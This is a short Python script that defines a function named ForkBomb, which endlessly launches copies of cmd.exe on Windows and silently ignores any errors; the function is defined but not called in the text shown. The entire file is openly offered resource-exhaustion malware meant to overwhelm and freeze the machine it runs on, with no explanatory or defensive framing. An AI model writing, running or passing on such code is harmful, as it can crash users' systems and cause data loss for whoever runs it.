# Import modules

import os


# Infinitely creates copies of selected programs

def ForkBomb():
 while True:
  try:
   os.startfile('cmd.exe')
  except:
   pass